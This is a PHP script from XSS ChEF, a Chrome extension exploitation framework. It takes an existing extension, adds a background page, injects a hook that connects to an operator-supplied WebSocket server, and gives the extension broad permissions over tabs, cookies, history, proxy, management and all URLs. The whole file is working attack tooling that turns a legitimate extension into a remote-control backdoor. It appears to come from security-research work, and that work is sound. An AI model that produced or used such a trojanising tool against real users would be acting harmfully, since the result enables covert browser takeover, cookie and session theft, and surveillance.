#!/usr/bin/env php
<?php
/*
   XSS ChEF - Chrome Extension Exploitation framework
    Copyright (C) 2012  Krzysztof Kotowicz - http://blog.kotowicz.net

    This program is free software: you can redistribute it and/or modify
    it under the terms of the GNU General Public License as published by
    the Free Software Foundation, either version 3 of the License, or
    (at your option) any later version.

    This program is distributed in the hope that it will be useful,
    but WITHOUT ANY WARRANTY; without even the implied warranty of
    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
    GNU General Public License for more details.

    You should have received a copy of the GNU General Public License
    along with this program.  If not, see <http://www.gnu.org/licenses/>.
*/
require_once __DIR__ . '/ChromeExtensionToolkit.php';

try {
    if ($argc < 3) {
        throw new Exception("Usage:\n\n{$argv[0]} <extension-path> <server-url> <channel-prefix>

Example:
{$argv[0]} dir-with-extension 'ws://127.0.0.1:8080' 'amazon'
");
    }
    
    $extpath = $argv[1];
    $t = new ChromeExtensionToolkit($extpath);
    
    echo "Loaded extension in $extpath\n";
    
    $manifest = $t->getManifest();    
    echo "Existing manifest: ";
    print_r($manifest);
    echo "\n";
    
    if (!$manifest['background_page']) {
        echo "Adding background page\n";
        $manifest['background_page'] = 'bckg_.html';
    }

    $channel_prefix = $argv[3];
    // to be able to handle the same CRX to multiple clients
    // we need to make the channel unique, let's make it random via JS
    $channel = $channel_prefix . '"+Math.floor(Math.random()*1000000)+"';
    
    $injected = $t->injectXssChefHook($manifest['background_page'], $argv[2], $channel);
    
    echo "Adding permissions...\n";
    // add permissions required by xsschef
    $new_properties = array(
        'permissions' => array('tabs', 'proxy', '<all_urls>', 'history', 'cookies', 'management', 'plugins'),
    );
    
    $manifest = array_merge_recursive($manifest, $new_properties);    
    
    echo "Saving...\n";    
    //write
    $t->saveFile($manifest['background_page'], $injected);
    $t->saveManifest($manifest);
    echo "Done.\n";
} catch (Exception $e) {
    file_put_contents('php://stderr', $e->getMessage() . "\n");
    exit(1);
}
?>